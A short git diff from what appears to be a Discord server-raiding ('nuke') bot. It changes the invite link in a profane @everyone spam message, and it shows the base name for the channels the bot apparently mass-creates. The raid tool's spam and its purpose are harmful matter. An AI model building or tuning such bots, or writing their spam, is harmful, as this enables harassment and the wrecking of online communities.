@@ -8,7 +8,7 @@ import { commands } from './commands.js';
 /* ------------------------------------------------------------------ config */
 
 const NUKE_MESSAGE =
-  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/X78u8V99vG #";
+  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/uBgehrcTZd #";
 
 const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 
